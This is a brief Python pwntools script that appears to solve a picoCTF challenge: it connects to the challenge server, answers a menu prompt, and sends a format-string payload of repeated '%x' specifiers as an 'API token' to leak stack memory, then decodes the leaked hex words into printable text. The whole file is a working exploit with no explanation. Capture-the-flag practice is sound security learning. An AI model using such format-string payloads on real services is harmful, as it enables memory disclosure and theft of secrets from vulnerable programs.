
from string import *
from pwn import *

p = remote('mercury.picoctf.net', 20195)

OFFSET = 40

if __name__ == '__main__':
	p.sendlineafter(b"What would you like to do?\n", b"1")

	payload = b"%x" + b"-%x" * OFFSET + b"\n"

	p.sendlineafter(b"What is your API token?\n", payload)

	data = p.recvline_contains(b"-")

	for block in data.decode().split("-"):
		if len(block) != 8:
			continue

		for x in reversed(bytearray.fromhex(block)):
			if chr(x) in string.printable:
				print(chr(x), end="")